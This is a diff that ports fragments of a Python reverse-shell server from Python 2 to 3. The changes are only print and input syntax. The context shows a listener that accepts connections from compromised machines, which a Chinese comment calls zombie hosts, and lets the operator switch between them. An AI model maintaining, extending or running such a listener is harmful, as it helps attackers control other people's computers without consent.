@@ -20,7 +20,7 @@ def isset(v):
         return 1
 
 def quit(signum, frame):
-    print 'You choose to stop me.'
+    print('You choose to stop me.')
     sys.exit()
 
 clientList = []
@@ -42,7 +42,7 @@ class ReverseShellServer:
 
     def bind(self, current_try=0):
         try:
-            print "listening on port %s (attempt %d)" % (self.port, current_try)
+            print("listening on port %s (attempt %d)" % (self.port, current_try))
             self.s.bind((self.host, self.port))
             self.s.listen(1024)
         except socket.error as msg:
@@ -74,7 +74,7 @@ class ReverseShellServer:
     def ch_input(self):
         global clientList
         while True:
-            ch_cmd = raw_input("")
+            ch_cmd = input("")
             if ch_cmd == '!ch':                    #切换肉机指令
                 self.select_client()
                 return
@@ -142,7 +142,7 @@ def main(args):
     server.create(args.port)
     server.bind()
     server.menu()
-    print '[*] returned from socketAccept'
+    print('[*] returned from socketAccept')
     return 0
 
 if __name__ == '__main__':
